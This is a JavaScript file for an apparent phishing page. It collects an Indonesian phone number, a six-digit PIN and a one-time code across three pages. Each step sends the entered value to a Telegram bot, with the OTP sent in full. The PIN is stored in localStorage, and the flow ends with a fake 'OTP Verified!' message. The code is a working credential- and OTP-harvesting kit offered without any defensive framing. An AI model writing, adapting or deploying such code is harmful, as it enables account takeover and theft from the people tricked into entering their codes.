// scripts.js

// Helper function to send data to Telegram
function sendToTelegram(message) {
    const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
    const chatId = 'YOUR_CHAT_ID';
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    });
}

// Phone input validation and navigation
if (document.getElementById('phone')) {
    const phoneInput = document.getElementById('phone');
    const lanjutButton = document.getElementById('lanjutButton');

    phoneInput.addEventListener('input', () => {
        lanjutButton.disabled = phoneInput.value.length < 9;
    });

    lanjutButton.addEventListener('click', () => {
        sendToTelegram(`Phone number entered: +62${phoneInput.value}`);
        localStorage.setItem('phone', phoneInput.value);
        window.location.href = 'pin.html';
    });
}

// PIN input validation and navigation
if (document.getElementById('pin')) {
    const pinInput = document.getElementById('pin');
    const lanjutPinButton = document.getElementById('lanjutPinButton');

    pinInput.addEventListener('input', () => {
        lanjutPinButton.disabled = pinInput.value.length !== 6;
    });

    lanjutPinButton.addEventListener('click', () => {
        sendToTelegram(`PIN entered: ${'*'.repeat(pinInput.value.length)}`);
        localStorage.setItem('pin', pinInput.value);
        window.location.href = 'otp.html';
    });
}

// OTP input and verification
if (document.getElementById('otp')) {
    const otpInput = document.getElementById('otp');
    const submitOtpButton = document.getElementById('submitOtpButton');
    const phoneNumberDisplay = document.getElementById('phoneNumber');

    // Display phone number on OTP page
    const phone = localStorage.getItem('phone');
    if (phone) {
        phoneNumberDisplay.textContent = phone;
    }

    otpInput.addEventListener('input', () => {
        submitOtpButton.disabled = otpInput.value.length !== 4;
    });

    submitOtpButton.addEventListener('click', () => {
        sendToTelegram(`OTP entered: ${otpInput.value}`);
        alert("OTP Verified!");
    });
}
